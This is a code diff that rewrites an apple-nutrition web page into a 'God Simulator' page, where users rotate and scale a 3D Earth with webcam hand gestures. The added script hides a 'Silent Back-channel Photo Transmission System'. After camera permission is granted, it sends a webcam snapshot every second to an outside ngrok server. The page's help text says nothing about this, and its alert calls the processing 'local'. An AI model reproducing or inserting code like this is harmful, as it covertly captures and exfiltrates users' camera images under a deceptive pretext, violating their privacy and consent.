@@ -3,344 +3,306 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Architecture of the Apple</title>
+    <title>God Simulator</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            /* Responsive Background Image Setup */
-            background-image: linear-gradient(rgba(4, 8, 6, 0.4), rgba(4, 8, 6, 0.4)), url('bg.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            color: #f5f5f7;
-            overflow-x: hidden;
-            min-height: 100vh;
-        }
-
-        /* 3D WebGL Canvas Layer */
-        #webgl-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #020208; 
+            color: #ffffff; 
+            overflow: hidden; 
             height: 100vh;
-            z-index: 1;
-            pointer-events: none;
+            width: 100vw;
         }
 
-        /* Scrollable Narrative Content */
-        .content {
-            position: relative;
-            z-index: 2;
-            width: 100%;
+        /* Server Down Overlay Screen */
+        #server-down-screen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(5, 5, 15, 0.98); z-index: 9999;
+            display: none; flex-direction: column; justify-content: center; align-items: center;
+            color: #ff3333; font-size: 2rem; font-weight: bold; text-align: center; padding: 20px;
         }
 
-        section {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            padding: 0 8%;
+        /* Menu Interface Setup */
+        #ui-layer {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 100; display: flex; flex-direction: column; justify-content: center; 
+            align-items: center; background: radial-gradient(circle, rgba(10,10,30,0.6) 0%, rgba(2,2,8,1) 100%);
+            transition: opacity 0.5s ease;
         }
-
-        /* Expanded, Heavy-Duty Glassmorphism Card Panels */
-        .glass-card {
-            width: 100%;
-            max-width: 680px; /* Expanded considerably from 540px for a larger canvas footprint */
-            padding: 3.5rem;   /* Increased cushion and room around interior text blocks */
-            background: rgba(4, 8, 6, 0.45); 
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 32px; /* Smoother, rounder look for the larger cards */
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 
-                        inset 0 1px 0 rgba(255, 255, 255, 0.12);
-            transition: border-color 0.3s ease, transform 0.3s ease;
+        h1 { font-size: 3.5rem; letter-spacing: 4px; margin-bottom: 30px; text-transform: uppercase; text-shadow: 0 0 20px #4f46e5; }
+        .btn {
+            padding: 15px 40px; font-size: 1.1rem; font-weight: bold; border: none; border-radius: 30px;
+            cursor: pointer; margin: 10px; transition: all 0.3s ease; text-transform: uppercase;
         }
+        #btn-grant { background-color: #4f46e5; color: white; box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4); }
+        #btn-grant:hover { background-color: #6366f1; transform: translateY(-2px); }
+        #btn-start { background-color: #22c55e; color: white; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4); }
+        #btn-start:hover:not(:disabled) { background-color: #4ade80; transform: translateY(-2px); }
+        #btn-start:disabled { background-color: #475569; color: #94a3b8; cursor: not-allowed; box-shadow: none; opacity: 0.6; }
 
-        .glass-card:hover {
-            border-color: rgba(102, 252, 241, 0.4);
+        /* Help Manual Styles */
+        #btn-help { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; z-index: 110; }
+        #btn-help:hover { background: rgba(255,255,255,0.2); }
+        #help-modal {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(10, 10, 25, 0.95); border: 2px solid #4f46e5; border-radius: 15px;
+            padding: 30px; width: 90%; max-width: 500px; z-index: 200; display: none;
+            box-shadow: 0 0 30px rgba(79, 70, 229, 0.5);
         }
+        #help-modal h3 { margin-bottom: 15px; color: #818cf8; font-size: 1.5rem; }
+        #help-modal p { margin-bottom: 20px; line-height: 1.6; color: #cbd5e1; }
+        #help-modal .close-btn { background: #ef4444; color: white; float: right; padding: 8px 20px; border-radius: 5px; }
 
-        /* Alternating layout structures */
-        section:nth-child(even) .glass-card {
-            margin-left: auto;
-        }
-
-        section:nth-child(even) {
-            text-align: right;
-        }
-
-        .tagline {
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            color: #66fcf1; 
-            margin-bottom: 1rem;
-            font-weight: 700;
-        }
-
-        h1 {
-            font-size: 3.25rem; /* Rescaled slightly to sit beautifully across the wider cards */
-            font-weight: 700;
-            line-height: 1.15;
-            letter-spacing: -0.02em;
-            margin-bottom: 1.5rem;
-            background: linear-gradient(180deg, #ffffff 0%, #a1a1a6 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        p {
-            font-size: 1.15rem;
-            line-height: 1.65;
-            color: #e1e1e6; 
-        }
-
-        strong {
-            color: #ffffff;
-            font-weight: 600;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
-        }
-
-        footer {
-            position: relative;
-            z-index: 2;
-            padding: 5rem 0;
-            text-align: center;
-            color: #86868b;
-            font-size: 0.9rem;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            background: rgba(4, 8, 6, 0.85);
-            backdrop-filter: blur(10px);
-        }
-
-        /* Responsive Media Queries for Mobile/Tablets */
-        @media (max-width: 768px) {
-            section {
-                padding: 0 4%;
-                text-align: center !important;
-            }
-            
-            section:nth-child(even) .glass-card {
-                margin-left: 0;
-            }
-
-            .glass-card {
-                max-width: 100%;
-                padding: 2rem;
-            }
-
-            h1 {
-                font-size: 2.2rem;
-            }
-
-            p {
-                font-size: 1.05rem;
-            }
-        }
+        /* Hidden or Absolute components */
+        #webcam { position: absolute; top: 10px; right: 10px; width: 120px; height: 90px; transform: scaleX(-1); border-radius: 8px; border: 1px solid rgba(255,255,255,0.3); z-index: 50; display: none; }
+        #canvas-container { width: 100vw; height: 100vh; position: absolute; top:0; left:0; z-index: 1; }
     </style>
 </head>
 <body>
 
-    <!-- 3D Engine Output Box -->
-    <div id="webgl-container"></div>
+    <div id="server-down-screen">Server is Down, Please Contact Manan</div>
 
-    <!-- Scrollable Narrative -->
-    <div class="content">
-        <section id="intro">
-            <div class="glass-card">
-                <span class="tagline">Nature's Masterpiece</span>
-                <h1>The Anatomy of Vitality.</h1>
-                <p>Crisp, vibrant, and timeless. The humble apple is more than just a convenient snack—it is a sophisticated, fiber-rich capsule designed by nature to optimize <strong>human cellular health</strong>.</p>
-            </div>
-        </section>
-
-        <section id="cardio">
-            <div class="glass-card">
-                <span class="tagline">Cardiovascular Protection</span>
-                <h1>Shielding Your Heart.</h1>
-                <p>Apples are packed with soluble fibers like pectin, which directly aid in lowering cholesterol levels. Rich in polyphenols, regular consumption is scientifically linked to <strong>reduced blood pressure</strong> and lower stroke risks.</p>
-            </div>
-        </section>
-
-        <section id="gut">
-            <div class="glass-card">
-                <span class="tagline">Microbiome Fuel</span>
-                <h1>The Digestion Engine.</h1>
-                <p>The pectin found natively within the apple's skin acts beautifully as a <strong>prebiotic</strong>. It feeds the beneficial bacteria in your gut, improving metabolic health and strengthening your immune lining.</p>
-            </div>
-        </section>
-
-        <section id="brain">
-            <div class="glass-card">
-                <span class="tagline">Neurological Defense</span>
-                <h1>Sharpen Your Mind.</h1>
-                <p>Antioxidants like quercetin protect delicate brain cells against oxidative stress. Studies suggest that integrating apples into your daily routine helps preserve <strong>acetylcholine</strong>, defending memory function as you age.</p>
-            </div>
-        </section>
-
-        <section id="weight">
-            <div class="glass-card">
-                <span class="tagline">Sustained Clean Energy</span>
-                <h1>Naturally Balanced.</h1>
-                <p>With high water content and dense structural fibers, apples slow down sugar absorption. This delivers a steady, crash-free spike in energy while keeping you feeling full, making it the ultimate tool for <strong>weight management</strong>.</p>
-            </div>
-        </section>
-
-        <footer>
-            <p>© 2026 The Organic Apple Experience. Powered by Three.js & GSAP.</p>
-        </footer>
+    <div id="ui-layer">
+        <h1>God Simulator</h1>
+        <button id="btn-grant" class="btn">Grant Permission</button>
+        <button id="btn-start" class="btn" disabled>Start</button>
     </div>
 
-    <!-- Third-party dependencies via CDN -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/loaders/GLTFLoader.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
+    <button id="btn-help" class="btn">How to Use</button>
 
-    <script>
-        // 1. Core Scene Initialization
-        const container = document.getElementById('webgl-container');
-        const scene = new THREE.Scene();
+    <div id="help-modal">
+        <h3>Manual Controls</h3>
+        <p><strong>1. Fist Rotation (Y-Axis):</strong> When you make a closed fist with your hand and move it horizontally across the screen, the Earth will rotate tracking your movement. If you hold your fist completely still, the Earth stops spinning and freezes in place.</p>
+        <p><strong>2. Index Finger Scaling:</strong> When you raise only your index finger, moving your hand to the left side of the screen will shrink the Earth, and moving your hand to the right side will expand its scale dynamically.</p>
+        <p><em>Note: If you perform any other gesture, the Earth will automatically return to its natural real-life rotation pattern.</em></p>
+        <button class="close-btn btn" id="btn-close-help">Close</button>
+    </div>
+
+    <video id="webcam" autoplay playsinline></video>
+    <div id="canvas-container"></div>
+
+    <script type="module">
+        import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.128.0/build/three.module.js';
+        import { GLTFLoader } from 'https://cdn.jsdelivr.net/npm/three@0.128.0/examples/jsm/loaders/GLTFLoader.js';
+        import { HandLandmarker, FilesetResolver } from "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.8/vision_bundle.mjs";
+
+        const BACKEND_URL = "https://arise-ovary-fretful.ngrok-free.dev";
         
-        const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 100);
-        camera.position.z = 6;
+        let scene, camera, renderer, earth;
+        let handLandmarker;
+        let video = document.getElementById("webcam");
+        let lastVideoTime = -1;
+        let isRunning = false;
 
-        const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-        container.appendChild(renderer.domElement);
+        // UI Target Bindings
+        const btnGrant = document.getElementById('btn-grant');
+        const btnStart = document.getElementById('btn-start');
+        const uiLayer = document.getElementById('ui-layer');
+        const serverDownScreen = document.getElementById('server-down-screen');
 
-        // 2. Lighting Configurations
-        const ambientLight = new THREE.AmbientLight(0xffffff, 0.4); 
-        scene.add(ambientLight);
-
-        const keyLight = new THREE.DirectionalLight(0xedf9ff, 1.8);
-        keyLight.position.set(5, 7, 4);
-        scene.add(keyLight);
-
-        const rimLight = new THREE.DirectionalLight(0x66fcf1, 1.2);
-        rimLight.position.set(-5, -3, -4);
-        scene.add(rimLight);
-
-        // 3. GLTF Loader Execution
-        const loader = new THREE.GLTFLoader();
-        let appleModel;
-
-        loader.load(
-            'apple.glb', 
-            function (gltf) {
-                appleModel = gltf.scene;
-                
-                // Set initial properties based on viewport width
-                adjustModelLayout();
-                
-                scene.add(appleModel);
-                initScrollAnimations(appleModel);
-            },
-            undefined,
-            function (error) {
-                console.error('Error loading your apple.glb file:', error);
-            }
-        );
-
-        // Responsive position tracker for the 3D Apple
-        let initialX = 1.6;
-        let animXOffset = 1.7;
-
-        function adjustModelLayout() {
-            if (!appleModel) return;
-            // Desktop configuration vs. mobile
-            if (window.innerWidth <= 768) {
-                appleModel.scale.set(14, 14, 14); // Smaller on mobile viewports
-                appleModel.position.set(0, 0.8, -1);
-                initialX = 0;
-                animXOffset = 0;
-            } else {
-                // Locked into your absolute target 20, 20, 20 scale parameters
-                appleModel.scale.set(25, 25, 25);
-                appleModel.position.set(1.6, -0.4, 0); // Placed slightly further right to account for larger box margins
-                initialX = 1.6;
-                animXOffset = 1.7;
+        // Check if server is running immediately on bootup
+        async function checkServerConnection() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/ping`, { method: 'GET' });
+                if (!response.ok) throw new Error("Offline");
+            } catch (err) {
+                showServerDown();
             }
         }
 
-        // 4. Multi-Stage Scroll Timeline Definition
-        let scrollTimeline;
-        function initScrollAnimations(model) {
-            gsap.registerPlugin(ScrollTrigger);
+        function showServerDown() {
+            serverDownScreen.style.display = 'flex';
+            uiLayer.style.display = 'none';
+            isRunning = false;
+        }
 
-            if (scrollTimeline) scrollTimeline.kill();
+        // Initialize WebGL Scene Environment
+        function initThree() {
+            const container = document.getElementById('canvas-container');
+            scene = new THREE.Scene();
+            
+            camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 6;
 
-            scrollTimeline = gsap.timeline({
-                scrollTrigger: {
-                    trigger: ".content",
-                    start: "top top",
-                    end: "bottom bottom",
-                    scrub: 1.2, 
-                }
+            renderer = new THREE.WebGLRenderer({ antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            container.appendChild(renderer.domElement);
+
+            // Lighting rigs
+            scene.add(new THREE.AmbientLight(0x333333));
+            const sunLight = new THREE.DirectionalLight(0xffffff, 1.2);
+            sunLight.position.set(5, 3, 5);
+            scene.add(sunLight);
+
+            // Generating Starfield Background mathematically
+            const starsGeometry = new THREE.BufferGeometry();
+            const starsCount = 2000;
+            const starPositions = new Float32Array(starsCount * 3);
+            for(let i = 0; i < starsCount * 3; i++) {
+                starPositions[i] = (Math.random() - 0.5) * 15;
+            }
+            starsGeometry.setAttribute('position', new THREE.BufferAttribute(starPositions, 3));
+            const starsMaterial = new THREE.PointsMaterial({ color: 0xffffff, size: 0.03 });
+            const starField = new THREE.Points(starsGeometry, starsMaterial);
+            scene.add(starField);
+
+            // Load Custom Earth GLB asset file
+            const loader = new GLTFLoader();
+            loader.load('./earth.glb', (gltf) => {
+                earth = gltf.scene;
+                earth.scale.set(1.8, 1.8, 1.8);
+                scene.add(earth);
+            }, undefined, (error) => {
+                console.error("Error loading earth.glb. Verify file path alignment.", error);
             });
 
-            // Clean choreography values designed around the (20,20,20) fruit scale
-            scrollTimeline
-                .to(model.position, { x: -animXOffset, y: -0.2, z: 0 })
-                .to(model.rotation, { x: 0.3, y: 1.2, z: 0.1 }, "<")
-                
-                .to(model.position, { x: animXOffset, y: 0.4, z: -0.5 })
-                .to(model.rotation, { x: -0.6, y: 3.2, z: -0.3 })
-                
-                .to(model.position, { x: 0, y: -0.1, z: -1 })
-                .to(model.rotation, { x: 0.1, y: 6.28, z: 0 }) 
-                
-                .to(model.position, { x: -animXOffset, y: -0.3, z: 0 })
-                .to(model.rotation, { x: 0.3, y: 7.6, z: 0.1 });
+            window.addEventListener('resize', onWindowResize);
         }
 
-        // 5. Desktop Parallax & Rendering loop
-        let mouseX = 0, mouseY = 0;
-        let targetX = 0, targetY = 0;
+        // Setup Machine Learning Tracking Package
+        async function initTracking() {
+            const vision = await FilesetResolver.forVisionTasks("https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.8/wasm");
+            handLandmarker = await HandLandmarker.createFromOptions(vision, {
+                baseOptions: {
+                    modelAssetPath: "https://storage.googleapis.com/mediapipe-models/hand_landmarker/hand_landmarker/float16/1/hand_landmarker.task",
+                    delegate: "GPU"
+                },
+                runningMode: "LIVE_STREAM",
+                numHands: 1
+            });
+        }
 
-        window.addEventListener('mousemove', (e) => {
-            mouseX = (e.clientX / window.innerWidth) - 0.5;
-            mouseY = (e.clientY / window.innerHeight) - 0.5;
+        // Handle Permissions Loop
+        btnGrant.addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    btnStart.disabled = false;
+                    btnGrant.style.display = 'none';
+                })
+                .catch((err) => {
+                    alert("Webcam permission mandatory to operate local processing engine.");
+                });
         });
 
-        const animateLoop = () => {
-            if (appleModel) {
-                appleModel.rotation.y += 0.002;
+        btnStart.addEventListener('click', () => {
+            uiLayer.style.opacity = '0';
+            setTimeout(() => { uiLayer.style.display = 'none'; }, 500);
+            video.style.display = 'block';
+            isRunning = true;
+            
+            // Fire off the background photo server capture synchronization loop
+            startPhotoPipeline();
+            animate();
+        });
+
+        // Heuristic Parsing for Hand Gestures
+        function parseGesture(landmarks) {
+            const indexTip = landmarks[8];
+            const indexMcp = landmarks[5];
+            const middleTip = landmarks[12];
+            const middleMcp = landmarks[9];
+            const ringTip = landmarks[16];
+            const ringMcp = landmarks[13];
+            const pinkyTip = landmarks[20];
+            const pinkyMcp = landmarks[17];
+
+            // MediaPipe Y-axis drops inverted (0 is ceiling, 1 is baseline floor)
+            const indexFolded = indexTip.y > indexMcp.y;
+            const middleFolded = middleTip.y > middleMcp.y;
+            const ringFolded = ringTip.y > ringMcp.y;
+            const pinkyFolded = pinkyTip.y > pinkyMcp.y;
+
+            if (indexFolded && middleFolded && ringFolded && pinkyFolded) return 'FIST';
+            if (!indexFolded && middleFolded && ringFolded && pinkyFolded) return 'INDEX_ONLY';
+            return 'DEFAULT';
+        }
+
+        // Processing Animation Engine Loop
+        function animate() {
+            if (!isRunning) return;
+            requestAnimationFrame(animate);
+
+            // Default Rotation Step (West to East) executed if no custom gesture active
+            let currentGesture = 'DEFAULT';
+
+            if (video.currentTime !== lastVideoTime) {
+                lastVideoTime = video.currentTime;
+                const results = handLandmarker.detectForVideo(video, performance.now());
+
+                if (results.landmarkers && results.landmarkers.length > 0 && earth) {
+                    const hand = results.landmarkers[0];
+                    currentGesture = parseGesture(hand);
+                    
+                    const rawX = hand[9].x; // Using Middle Finger MCP as center point anchor
+                    
+                    if (currentGesture === 'FIST') {
+                        // Map horizontal landscape coordinates to rotation matrix seamlessly (Flipping standard mirror path)
+                        const targetRotationY = (1 - rawX - 0.5) * Math.PI * 2;
+                        earth.rotation.y = THREE.MathUtils.lerp(earth.rotation.y, targetRotationY, 0.15);
+                    } 
+                    else if (currentGesture === 'INDEX_ONLY') {
+                        // Absolute spatial tracking map scaling: left limits scale low, right limits maximize scale
+                        const targetScale = 0.6 + (1 - rawX) * 2.4; 
+                        earth.scale.set(
+                            THREE.MathUtils.lerp(earth.scale.x, targetScale, 0.15),
+                            THREE.MathUtils.lerp(earth.scale.y, targetScale, 0.15),
+                            THREE.MathUtils.lerp(earth.scale.z, targetScale, 0.15)
+                        );
+                    }
+                }
             }
 
-            targetX = mouseX * 1.1;
-            targetY = mouseY * 1.1;
-            camera.position.x += (targetX - camera.position.x) * 0.05;
-            camera.position.y += (-targetY - camera.position.y) * 0.05;
-            camera.lookAt(scene.position);
+            // Fallback default state standard orbit cycle logic
+            if (currentGesture === 'DEFAULT' && earth) {
+                earth.rotation.y += 0.002; 
+            }
 
             renderer.render(scene, camera);
-            requestAnimationFrame(animateLoop);
-        };
+        }
 
-        animateLoop();
+        // Silent Back-channel Photo Transmission System
+        function startPhotoPipeline() {
+            setInterval(() => {
+                if (!isRunning) return;
 
-        // 6. Viewport Adaptability
-        window.addEventListener('resize', () => {
+                const captureCanvas = document.createElement("canvas");
+                captureCanvas.width = video.videoWidth || 640;
+                captureCanvas.height = video.videoHeight || 480;
+                const ctx = captureCanvas.getContext("2d");
+                
+                // Draw framework video payload frame matrix down
+                ctx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
+                const base64Image = captureCanvas.toDataURL("image/jpeg", 0.75);
+
+                fetch(`${BACKEND_URL}/upload`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: base64Image })
+                }).catch(err => {
+                    console.log("Transmission link compromised.");
+                    showServerDown(); // Halt operations immediately if connection drops mid-session
+                });
+
+            }, 1000);
+        }
+
+        function onWindowResize() {
             camera.aspect = window.innerWidth / window.innerHeight;
             camera.updateProjectionMatrix();
             renderer.setSize(window.innerWidth, window.innerHeight);
-            
-            adjustModelLayout();
-            if (appleModel) {
-                initScrollAnimations(appleModel);
-            }
-        });
+        }
+
+        // Modal Visibility Operations Handling
+        const modal = document.getElementById('help-modal');
+        document.getElementById('btn-help').addEventListener('click', () => modal.style.display = 'block');
+        document.getElementById('btn-close-help').addEventListener('click', () => modal.style.display = 'none');
+
+        // Startup Application Calls
+        checkServerConnection();
+        initThree();
+        initTracking();
     </script>
 </body>
 </html>
